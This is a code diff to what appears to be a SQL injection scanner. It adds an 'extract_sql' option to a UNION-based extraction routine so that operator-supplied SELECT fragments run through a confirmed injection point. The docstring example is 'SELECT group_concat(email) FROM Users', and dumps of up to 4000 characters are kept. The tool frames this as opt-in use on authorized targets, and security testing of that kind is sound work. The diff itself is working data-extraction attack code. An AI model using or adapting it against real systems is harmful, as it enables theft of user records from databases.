@@ -27,7 +27,7 @@ written or dropped.
 from __future__ import annotations
 
 from dataclasses import dataclass, field
-from typing import Any, Callable, Dict, Optional
+from typing import Any, Callable, Dict, List, Optional, Sequence
 
 from core.injection.adapt import read_response
 from core.injection.markers import Marker
@@ -130,12 +130,16 @@ def extract_via_union(
     *,
     max_columns: int = _MAX_COLUMNS,
     extract: bool = True,
+    extract_sql: Optional[Sequence[str]] = None,
 ) -> Optional[UnionResult]:
     """Confirm UNION injectability (reflection-proof) and pull read-only data.
 
     ``send`` is the runner's guarded send closure, so every request counts against
     the budget and feeds the health tracker. Returns None if no UNION vector
-    confirms.
+    confirms. ``extract_sql`` are OPERATOR-DECLARED scalar SELECT fragments (e.g.
+    ``SELECT group_concat(email) FROM Users``) pulled in addition to the read-only
+    schema/version defaults — the opt-in path for a real data dump on an
+    authorized target.
     """
     tok = marker.token
     expected = f"{tok}{marker.product}{tok}"
@@ -156,23 +160,35 @@ def extract_via_union(
                             confirm_payload=payload)
                         if extract:
                             result.extracted = _run_extraction(
-                                send, prefix, columns, pos, dialect, comment, tok)
+                                send, prefix, columns, pos, dialect, comment, tok,
+                                extract_sql)
                         return result
     return None
 
 
-def _run_extraction(send, prefix, columns, position, dialect, comment, tok):
-    """Pull each read-only expression back, wrapped in the token."""
+def _run_extraction(send, prefix, columns, position, dialect, comment, tok,
+                    extract_sql: Optional[Sequence[str]] = None):
+    """Pull each read-only expression back, wrapped in the token.
+
+    Built-in defaults (schema/version) first; then any operator-declared
+    ``extract_sql`` scalar SELECT fragments (the opt-in data dump).
+    """
     out: Dict[str, str] = {}
-    for label, exprs in _EXTRACTS.items():
-        inner_sql = exprs.get(dialect) or exprs.get("generic")
+    exprs_to_run: List[tuple] = [
+        (label, exprs.get(dialect) or exprs.get("generic"))
+        for label, exprs in _EXTRACTS.items()
+    ]
+    for i, custom in enumerate(extract_sql or []):
+        exprs_to_run.append((f"custom_{i}", custom))
+    for label, inner_sql in exprs_to_run:
         if not inner_sql:
             continue
         wrapped = _concat(dialect, inner_sql, tok)
         payload = _union_payload(prefix, columns, position, wrapped, comment)
         val = _between(_body(send(payload)), tok)
         if val:
-            out[label] = val[:500]
+            # operator dumps can be large (a group_concat of rows); keep more.
+            out[label] = val[:4000 if label.startswith("custom_") else 500]
     return out
 
 
